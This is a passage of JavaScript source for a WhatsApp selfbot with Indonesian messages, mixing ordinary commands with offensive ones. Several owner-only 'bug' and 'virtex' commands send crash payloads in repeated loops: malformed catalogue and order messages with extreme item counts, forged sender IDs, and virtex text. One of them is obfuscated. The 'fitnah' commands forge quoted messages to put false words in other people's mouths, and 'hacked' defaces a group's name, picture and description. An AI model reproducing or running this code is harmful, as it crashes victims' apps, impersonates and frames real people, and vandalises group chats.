                    var group = await giie.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(from, ini_buffer, image, options)
                    fs.unlinkSync(file)
                } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
                    encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
                    var group = await giie.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        mimetype: 'audio/mp4',
                        duration: 359996400,
                        ptt: true,
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(from, ini_buffer, audio, options)
                    fs.unlinkSync(file)
                } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
                    encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
                    var group = await giie.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        mimetype: 'video/gif',
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(from, ini_buffer, video, options)
                    fs.unlinkSync(file)
                } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
                    encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
                    var group = await giie.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        mimetype: 'text/plain',
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(from, ini_buffer, document, options)
                    fs.unlinkSync(file)
                } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
                    encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    file = await giie.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
                    value = args.join(" ")
                    var group = await giie.groupMetadata(from)
                    var member = group['participants']
                    var mem = []
                    member.map(async adm => {
                        mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        mimetype: 'video/mp4',
                        duration: 359996400,
                        contextInfo: {
                            mentionedJid: mem
                        },

                    }
                    ini_buffer = fs.readFileSync(file)
                    giie.sendMessage(from, ini_buffer, video, options)
                    fs.unlinkSync(file)
                } else {
                    reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
                }
                break
            case 'status':
            case 'stats':
                var groups = giie.chats.array.filter(v => v.jid.endsWith('g.us'))
                var privat = giie.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
                var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
                uptime = process.uptime();
                const timestampu = speed();
                const totalChat = await giie.chats.all()
                const latensi = speed() - timestampu
                var total = math(`${groups.length} ${privat.length}`)
                const {
                    wa_version, mcc, mnc, os_version, device_manufacturer, device_model
                } = giie.user.phone
                var stod = `${sender}`
                var uwu = '```'
                var stst = await giie.getStatus(`${sender.split('@')[0]}@c.us`)
                var stst = stst.status == 401 ? '' : stst.status
                stamtus = `*INFO SAYA* :

*Private Chat :* ${privat.length}
*Group Chat :* ${groups.length}
*Total Chat :* ${totalChat.length}
*Speed :* ${latensi.toFixed(4)} second
*Runtime :* ${kyun(uptime)}
*Baterai :* ${baterai.battery}
*Charged :* ${baterai.isCharge}
*Mode :* ${publik ? 'public' : 'self'}
*Prefix :* ${multi ? 'Multi Prefix' : 'No Prefix'}
*Penggunaan Ram :* ${ram2}
*Hostname :* ${os.hostname()}
*Platform :* ${os.platform()}
*Uptime :* ${kyun(os.uptime())}
*MNC :* ${mnc}
*MCC :* ${mcc}
*Device Model:* ${giie.user.phone.device_model}
*Device Manufactur :* ${device_manufacturer}
*Wa Version:* ${giie.user.phone.wa_version}
*Os Version:* ${giie.user.phone.os_version}
`
                grupinv(stamtus)
                stamyou = `*INFO KAMU* :

*Status :* ${isOwner ? 'Owner' : 'Friends'}
*Name :* ${pushname}
*Biodata :* ${stst}
*Nomor :* ${stod.split('@')[0]}
*Info Nomor :* ${num.data.countrycode} - ${num.data.carrier.type} - ${num.data.carrier.name}`
                grupinv(stamyou)
                break
            case 'tobc':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                giie.updatePresence(from, Presence.composing)
                anu = await giie.chats.all()
                if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
                    const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    buff = await giie.downloadMediaMessage(encmedia)
                    for (let _ of anu) {
                        giie.sendMessage(_.jid, buff, audio, {
                            quoted: fvid
                        })
                    }
                } else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
                    const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    buff = await giie.downloadMediaMessage(encmedia)
                    for (let _ of anu) {
                        giie.sendMessage(_.jid, buff, sticker, {
                            quoted: fvid,
                            contextInfo: {
                                forwardingScore: 508,
                                isForwarded: true
                            }
                        })
                    }
                } else {
                    reply('reply sticker/audio')
                }
                break
            case 'fdeface':
                var nn = body.slice(9)
                var urlnye = nn.split("|")[0];
                var titlenye = nn.split("|")[1];
                var descnye = nn.split("|")[2];
                imgbbb = require('imgbb-uploader')
                run = getRandom('.jpeg')
                encmediad = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                mediad = await giie.downloadAndSaveMediaMessage(encmediad)
                ddatae = await imageToBase64(JSON.stringify(mediad).replace(/\"/gi, ''))
                giie.sendMessage(from, {
                    text: `${urlnye}`,
                    matchedText: `${urlnye}`,
                    canonicalUrl: `${urlnye}`,
                    description: `${descnye}`,
                    title: `${titlenye}`,
                    jpegThumbnail: ddatae
                }, 'extendedTextMessage', {
                    detectLinks: false
                })
                break


            case 'online':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                offline = false
                reply('Status : ONLINE')
                break
            case 'offline':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                offline = true
                waktuafk = Date.now()
                anuu = body.slice(9) ? body.slice(9) : '-'
                alasanafk = anuu
                reply('Fitur OFFLINE diaktifkan')
                break
            case 'fitnahpc':
                if (args.length < 1) return reply(`Usage :\n${prefix}fitnahpc [nomor|pesan|balasanbot]]\n\nEx : \n${prefix}fitnahpc 0|hai|hai juga markenlin`)
                var gh = body.slice(10)
                var parti = gh.split("|")[0];
                var targetq = gh.split("|")[1];
                var bot = gh.split("|")[2];
                giie.sendMessage(from, `${bot}`, text, {
                    quoted: {
                        key: {
                            fromMe: false,
                            participant: `${parti}@s.whatsapp.net`,
                            ...(from ? {
                                remoteJid: "status@broadcast"
                            } : {})
                        },
                        message: {
                            conversation: `${targetq}`
                        }
                    }
                })
                break
            case 'hidetag':
                if (!isGroup) return reply(mess.only.group)
                if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
                ht = body.slice(9)
                members_id = []
                for (let mem of groupMembers) {
                    members_id.push(mem.jid)
                }
                mentions(ht, members_id, false)
                break
            case 'fitnah':
                if (!isGroup) return reply(mess.only.group)
                cr = body.slice(4)
                cs = cr.split('|')
                taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const target = {
                    contextInfo: {
                        participant: taged,
                        quotedMessage: {
                            extendedTextMessage: {
                                text: cs[1]
                            }
                        }
                    }
                }
                giie.sendMessage(from, cs[2], MessageType.text, target)
                break
            case 'hacked':
                if (!isGroup) return reply(mess.only.group)
                if (args.length < 1) return reply('Teksnya?')
                reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                giie.updateProfilePicture(from, tessgc)
                await sleep(1000)
                giie.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                giie.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)
                await sleep(1000)
                giie.sendMessage(from, 'Succes Hacked', text, {
                    quoted: mek
                })
                break
            case 'mode':
                buttons = [{
                    buttonId: `${prefix}public`,
                    buttonText: {
                        displayText: 'PUBLIC'
                    },
                    type: 1
                }, {
                    buttonId: `${prefix}self`,
                    buttonText: {
                        displayText: 'SELF'
                    },
                    type: 1
                }]
                imageMsg = (await giie.prepareMessageMedia(dfrply, 'imageMessage')).imageMessage
                buttonsMessage = {
                    contentText: "PUBLIC: untuk mengaktifkan mode public\nSELF: untuk mengaktifkan mode self",
                    footerText: 'Silahkan click button dibawah ☟︎︎︎',
                    imageMessage: imageMsg,
                    buttons: buttons,
                    headerType: 4
                }
                prep = await giie.prepareMessageFromContent(from, {
                    buttonsMessage
                }, {
                    quoted: fgi
                })
                giie.relayWAMessage(prep)
                break
            case 'bugpc2':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Jumlahnya?')
                for (let i = 0; i < args[0]; i++) {
                    giie.sendMessage(from, `${NamaBot}`, MessageType.extendedText, {
                        quoted: {
                            key: {
                                participant: `0@s.whatsapp.net`,
                                ...(from ? {
                                    remoteJid: "status@broadcast"
                                } : {})
                            },
                            message: {
                                orderMessage: {
                                    itemCount: 99999999,
                                    status: 1,
                                    surface: 10,
                                    orderTitle: `${NamaOwner}`,
                                    sellerJid: '0@s.whatsapp.net'
                                }
                            }
                        }
                    }, 0)
                }
                break
            case 'bug':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Jumlahnya?')
                for (let i = 0; i < args[0]; i++) {
                    await giie.toggleDisappearingMessages(from, 0)
                }
                reply('Sukses send bug sebanyak ' + args.join(' '))
                break

            case 'bbaij72njnwjibdo16830nslm1782':
                reply(`${ngazap(prefix)}`)
                break
                //By Xchildss X YuzzuKamiyaka
            case 'virtex':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                katalog(`${ngazap(prefix)}`)
                katalog(`${emoji2(prefix)}`)
                katalog(`${virtex(prefix)}`)
                katalog(`${virtex2(prefix)}`)
                katalog(`${virtex3(prefix)}`)
                katalog(`${virtex4(prefix)}`)
                katalog(`${virtex5(prefix)}`)
                katalog(`${virtex6(prefix)}`)
                katalog(`${virtex7(prefix)}`)
                katalog(`${virtex8(prefix)}`)
                katalog(`${virtex9(prefix)}`)
                katalog(`${virtag(prefix)}`)
                break
            case 'bugkatalog':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                giie.toggleDisappearingMessages(from, 0)
                babi = (teks) => {
                    res = giie.prepareMessageFromContent(from, {
                        "orderMessage": {
                            "itemCount": 9999999,
                            "message": teks,
                            "footerText": `${emoji2(prefix)}`,
                            "thumbnail": ofrply,
                            "surface": 'CATALOG'
                        }
                    }, {
                        quoted: {
                            key: {
                                participant: '0@s.whatsapp.net' // Fake sender Jid
                            },
                            message: {
                                orderMessage: {
                                    itemCount: 9999999, // Bug
                                    status: 1,
                                    surface: 1,
                                    message: `${virtex6(prefix)}`,
                                    orderTitle: `${emoji2(prefix)}`, // Idk what this does
                                    sellerJid: '0@s.whatsapp.net' // Seller
                                }
                            }
                        }
                    })
                    giie.relayWAMessage(res)
                }
                babi(`${ngazap(prefix)}`)
                babi(`${virtag(prefix)}`)
                babi(`${virtex6(prefix)}`)
                babi(`${emoji2(prefix)}`)
                break

            case 'bugloc':
                function _0x4ee9(_0x1253de, _0x4df4d5) {
                    var _0x587b3c = _0x587b();
                    return _0x4ee9 = function(_0x4ee946, _0x170efd) {
                        _0x4ee946 = _0x4ee946 - 0x1c6;
                        var _0x33a62e = _0x587b3c[_0x4ee946];
                        return _0x33a62e;
                    }, _0x4ee9(_0x1253de, _0x4df4d5);
                }
                var _0x1fb12b = _0x4ee9;

                function _0x587b() {
                    var _0x573ab6 = ['readFileSync', '12536840GCstSf', 'sendMessage', 'only', '536IkuDmm', 'key', '2675700WtsjtO', 'ownerB', './gio.jpg', 'fromMe', '2224464MiisaG', '18qcFOZT', '83468rQXPeY', '0@s.whatsapp.net', '25944fErnRh', '115851EirsKL', '184fyRhDo', '178400WTzYEN'];
                    _0x587b = function() {
                        return _0x573ab6;
                    };
                    return _0x587b();
                }(function(_0x2dcd13, _0x2f923e) {
                    var _0x3d06c1 = _0x4ee9,
                        _0x2352ff = _0x2dcd13();
                    while (!![]) {
                        try {
                            var _0x266d76 = parseInt(_0x3d06c1(0x1cc)) / 0x1 + -parseInt(_0x3d06c1(0x1ce)) / 0x2 + -parseInt(_0x3d06c1(0x1cb)) / 0x3 * (parseInt(_0x3d06c1(0x1cd)) / 0x4) + -parseInt(_0x3d06c1(0x1d5)) / 0x5 + -parseInt(_0x3d06c1(0x1c7)) / 0x6 + -parseInt(_0x3d06c1(0x1c9)) / 0x7 * (parseInt(_0x3d06c1(0x1d3)) / 0x8) + -parseInt(_0x3d06c1(0x1c8)) / 0x9 * (-parseInt(_0x3d06c1(0x1d0)) / 0xa);
                            if (_0x266d76 === _0x2f923e) break;
                            else _0x2352ff['push'](_0x2352ff['shift']());
                        } catch (_0x4d3113) {
                            _0x2352ff['push'](_0x2352ff['shift']());
                        }
                    }
                }(_0x587b, 0x6953b));
                if (!isOwner && !mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)]) return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);
                giie[_0x1fb12b(0x1d1)](from, {
                    'degreesLatitude': 6.493187928699356,
                    'degreesLongitude': 80.30968201252108,
                    'name': '' + emoji2(prefix),
                    'address': '' + virtex6(prefix),
                    'jpegThumbnail': fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))
                }, location, {
                    'quoted': {
                        'key': {
                            'participant': _0x1fb12b(0x1ca)
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 0x98967f,
                                'status': 0x1,
                                'surface': 0x1,
                                'message': '' + NamaBot,
                                'orderTitle': '' + NamaOwner,
                                'sellerJid': '0@s.whatsapp.net'
                            }
                        }
                    }
                });
                break
            case 'buglink':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                giie.toggleDisappearingMessages(from, 0)
                giie.sendMessage(from, virtex3(prefix), text, {
                    quoted: ftrol,
                    contextInfo: {
                        text: '🔥',
                        "forwardingScore": 1000000000,
                        isForwarded: false,
                        sendEphemeral: false,
                        "externalAdReply": {
                            "title": `${virtex2(prefix)}`,
                            "body": "",
                            "previewType": "PHOTO",
                            "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
                            "thumbnail": fs.readFileSync(`./gio.jpg`),
                            "sourceUrl": "https://instagram.com/giiexsala"
                        }
                    }
                })
                break
            case 'bugbutton':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                giie.toggleDisappearingMessages(from, 0)
                sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {
                    jpegThumbnail: ofrply
                }, [{
                    buttonId: `${prefix}bbaij72njnwjibdo16830nslm1782`,
                    buttonText: {
                        displayText: 'GIONOVA🌹'
                    },
                    type: 1
                }])
                giie.toggleDisappearingMessages(from, 0)
                break
            case 'bugrow':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                giie.toggleDisappearingMessages(from, 0)
                listMsg = {
                    buttonText: 'LIST MENU',
                    footerText: `${emoji2(prefix)}`,
                    description: `${virtex6(prefix)}`,
                    sections: [{
                        "title": "CieKontol",
                        rows: [{
                            "title": "CieBug",
                            "rowId": ""
                        }]
                    }],
                    listType: 1
                }
                giie.sendMessage(from, listMsg, MessageType.listMessage, {
                    quoted: ftrol
                })
                giie.toggleDisappearingMessages(from, 0)
                break
                //Done
            case 'bugtroli2':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                if (args.length < 1) return reply('Jumlahnya?')
                try {
                    var hets = `${NamaBot}`
                    var grousp = await giie.groupMetadata(from)
                    var membere = grousp['participants']
                    var mems = []
                    membere.map(async adm => {
                        mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    var options = {
                        text: hets,
                        contextInfo: {
                            mentionedJid: mem
                        },
                        quoted: mek
                    }
                    for (let i = 0; i < args[0]; i++) {
                        giie.sendMessage(from, options, text, {
                            quoted: {
                                key: {
                                    fromMe: false,
                                    participant: `0@s.whatsapp.net`,
                                    ...(from ? {
                                        remoteJid: "62882248593508@s.whatsapp.net"
                                    } : {})
                                },
                                "message": {
                                    "orderMessage": {
                                        "orderId": "173388341205594",
                                        "itemCount": -3599964009,
                                        "status": "INQUIRY",
                                        "surface": "CATALOG",
                                        "message": `${NamaBot}`,
                                        "orderTitle": `${NamaOwner}`,
                                        "sellerJid": "6283161567237@s.whatsapp.net",
                                        "token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
                                    }
                                }
                            }
                        })
                    }
                } catch {
                    for (let i = 0; i < 10; i++) {
                        giie.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {
                            quoted: {
                                key: {
                                    fromMe: false,
                                    participant: `0@s.whatsapp.net`,
                                    ...(from ? {
                                        remoteJid: "62882248593508@s.whatsapp.net"
                                    } : {})
                                },
                                "message": {
                                    "orderMessage": {
                                        "orderId": "173388341205594",
                                        "itemCount": -3599964009,
                                        "status": "INQUIRY",
                                        "surface": "CATALOG",
                                        "message": `${NamaBot}`,
                                        "orderTitle": `${NamaOwner}`,
                                        "sellerJid": "6283161567237@s.whatsapp.net",
                                        "token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
                                    }
                                }
                            }
                        })
                    }
                }
                break
            case 'bugcombine':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                giie.toggleDisappearingMessages(from, 'HACKED')
                giie.sendMessage(from, `${NamaBot}`, text, {
                    quoted: {
                        key: {
                            participant: '0@s.whatsapp.net' // Fake sender Jid
                        },
                        message: {
                            orderMessage: {
                                itemCount: 9999999, // Bug
                                status: 1,
                                surface: 1,
                                message: `${NamaBot}`,
                                orderTitle: `${NamaOwner}`, // Idk what this does
                                sellerJid: '0@s.whatsapp.net' // Seller
                            }
                        }
                    }
                })
                setTimeout(() => {
                    giie.updatePresence(from, Presence.composing)
                    sendMess(`dahlah`)
                }, 2000)
                reply(`dahlah`)
                break
            case 'buglokasi':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                giie.updatePresence(from, Presence.composing)
                giie.sendMessage(from, {
                    degreesLatitude: 34.0184,
                    degreesLongitude: -118.411,
                    name: `${NamaOwner}`,
                    address: `${NamaBot}`,
                    jpegThumbnail: dfrply
                }, location, {
                    quoted: {
                        key: {
                            participant: '111111111@s.whatsapp.net' // Fake sender Jid
                        },
                        message: {
                            orderMessage: {
                                itemCount: 70000, // Bug
                                status: 1,
                                surface: 1,
                                message: `${NamaOwner}`,
                                orderTitle: `${NamaBot}`, // 
                                sellerJid: '0@s.whatsapp.net' // Seller
                            }
                        }
                    }
                })
                break
            case 'bugpc':
            case 'bugpc':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                giie.updatePresence(from, Presence.composing)
                giie.sendMessage(from, 'yaudah oke', text, {
                    quoted: {
                        key: {
                            participant: '1111111111@s.whatsapp.net' // Fake sender Jid
                        },
                        message: {
                            orderMessage: {
                                itemCount: 70000, // Bug
                                status: 1,
                                surface: 1,
                                message: `${NamaBot}`,
                                orderTitle: `${NamaOwner}`, // 
                                sellerJid: '0@s.whatsapp.net' // Seller
                            }
                        }
                    }
                })
                break
            case 'ytmp4':
                if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
                let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
                if (!isLinks2) return reply(mess.error.Iv)
                try {
                    reply(mess.wait)
                    ytv(args[0])
                        .then((res) => {
                            const {
                                dl_link,
                                thumb,
                                title,
                                filesizeF,
                                filesize
                            } = res
                            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                .then((a) => {
                                    if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                                    const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                                    sendMediaURL(from, thumb, captionsYtmp4)
                                    sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                                })
                        })
                } catch (err) {
                    reply(mess.error.api)
                }
                break
            case 'ytsearch':
                if (!args.length) return reply('Judulnya apa kak?')
                try {
                    reply(mess.wait)
                    const input = args.join(" ")
                    const filter1 = await ytsd.getFilters(input)
                    const filters1 = filter1.get('Type').get('Video')
                    const {
                        items
                    } = await ytsd(filters1.url, {
                        limit: 10
                    })
                    let hehe = `*YOUTUBE SEARCH :*
*Search Query:* ${input}\n`
                    for (let i = 0; i < items.length; i++) {
                        hehe += `───────────────
┌ ❏ *Judul:* ${items[i].title}
├ ❏ *Id:* ${items[i].id}
├ ❏ *Ditonton:* ${items[i].views}
├ ❏ *Durasi:* ${items[i].duration}
└ ❏ *Link:* ${items[i].url}\n`
                    }
                    thumb = await getBuffer(items[0].bestThumbnail.url)
                    await giie.sendMessage(from, thumb, image, {
                        quoted: mek,
                        caption: `${hehe}───────────────\n┌ ◪ *DOWNLOAD*
├ ${prefix}ytmp3 [link yt] = Audio
└ ${prefix}ytmp4 [link yt] = Video`
                    })
                } catch (e) {
                    reply('Didn\'t find anything or there is any error!')
                    reply(`Error: ${e.message}`)
                }
                break
            case 'ytmp3':
                if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
                let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
                if (!isLinks) return reply(mess.error.Iv)
                try {
                    reply(mess.wait)
                    yta(args[0])
                        .then((res) => {
                            const {
                                dl_link,
                                thumb,
                                title,
                                filesizeF,
                                filesize
                            } = res
                            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                .then((a) => {
                                    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                                    const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                                    sendMediaURL(from, thumb, captions)
                                    sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
                                })
                        })
                } catch (err) {
                    reply(mess.error.api)
                }
                break
            case 'play':
                if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
                reply(mess.wait)
                var srch = args.join('')
                aramas = await yts(srch);
                aramat = aramas.all
                var mulaikah = aramat[0].url
                try {
                    yta(mulaikah)
                        .then((res) => {
                            const {
                                dl_link,
                                thumb,
                                title,
                                filesizeF,
                                filesize
                            } = res
                            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                .then(async (a) => {
                                    if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `[ *YOUTUBE PLAY* ]\n\n*Title* : ${title}\n*Ext* : MP3\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
                                    const captions = `[ *YOUTUBE PLAY* ]\n\nPencarian untuk : *${srch}*\n*JUDUL* : ${title}\n*TYPE* : MP3-MP4\n*LINK* : ${a.data}\n\n_Silahkan Pilih Button !_\n_*MP3:*_ _untuk mendownload type mp3_\n_*MP4:*_ _untuk mendownload type mp4_`
                                    thumbb = await getBuffer(thumb)
                                    buttons = [{
                                        buttonId: `audio ${srch}`,
                                        buttonText: {
                                            displayText: 'MP3'
                                        },
                                        type: 1
                                    }, {
                                        buttonId: `video ${srch}`,
                                        buttonText: {
                                            displayText: 'MP4'
                                        },
                                        type: 1
                                    }]
                                    imageMsg = (await giie.prepareMessageMedia(thumbb, 'imageMessage')).imageMessage
                                    buttonsMessage = {
                                        contentText: captions,
                                        footerText: '2021 Powered by: AyogiAk',
                                        imageMessage: imageMsg,
                                        buttons: buttons,
                                        headerType: 4
                                    }
                                    prep = await giie.prepareMessageFromContent(from, {
                                        buttonsMessage
                                    }, {
                                        quoted: fgi
                                    })
                                    giie.relayWAMessage(prep).catch(() => reply('error'))
                                })
                        })
                } catch (err) {
                    reply(mess.error.api)
                }
                break
            case 'audio':
                if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
                reply(mess.wait)
                var srch = args.join('')
                aramas = await yts(srch);
                aramat = aramas.all
                var mulaikah = aramat[0].url
                try {
                    yta(mulaikah)
                        .then((res) => {
                            const {
                                dl_link,
                                thumb,
                                title,
                                filesizeF,
                                filesize
                            } = res
                            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                .then(async (a) => {
                                    await sendMediaURL(from, dl_link).catch(() => reply('error'))
                                })
                        })
                } catch (err) {
                    reply(mess.error.api)
                }
                break
            case 'video':
                if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
                reply(mess.wait)
                var srch = args.join('')
                aramas = await yts(srch);
                aramat = aramas.all
                var mulaikah = aramat[0].url
                try {
                    ytv(mulaikah)
                        .then((res) => {
                            const {
                                dl_link,
                                thumb,
                                title,
                                filesizeF,
                                filesize
                            } = res
                            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                                .then(async (a) => {
                                    await sendMediaURL(from, dl_link).catch(() => reply('error'))
                                })
                        })
                } catch (err) {
                    reply(mess.error.api)
                }
                break
            case 'readall':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                totalchat.map(async ({
                    jid
                }) => {
                    await giie.chatRead(jid)
                })
                grupinv(`\`\`\`Berhasil membaca semua chat !\`\`\``)
                console.log(totalchat.length)
                break
            case 'exif':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                const exifff = `${args.join(' ')}`
                const namaPack = exifff.split('|')[0]
                const authorPack = exifff.split('|')[1]
                exif.create(namaPack, authorPack)
                await reply('Done gan')
                break

            case 'sticker':
            case 'stiker':
            case 's':
                if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    const media = await giie.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
                    await ffmpeg(`${media}`)
                        .input(media)
                        .on('start', function(cmd) {
                            console.log(`Started : ${cmd}`)
                        })
                        .on('error', function(err) {
                            console.log(`Error : ${err}`)
                            fs.unlinkSync(media)
                            reply(mess.error.api)
                        })
                        .on('end', function() {
                            console.log('Finish')
                            exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
                                if (error) return reply(mess.error.api)
                                giie.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker)
                                fs.unlinkSync(media)
                                fs.unlinkSync(`./sticker/${sender}.webp`)
                            })
                        })
                        .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                        .toFormat('webp')
                        .save(`./sticker/${sender}.webp`)
                } else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
                    const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    const media = await giie.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
                    reply(mess.wait)
                    await ffmpeg(`${media}`)
                        .inputFormat(media.split('.')[4])
                        .on('start', function(cmd) {
                            console.log(`Started : ${cmd}`)
                        })
                        .on('error', function(err) {
                            console.log(`Error : ${err}`)
                            fs.unlinkSync(media)
                            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
                            reply(mess.error.api)
                        })
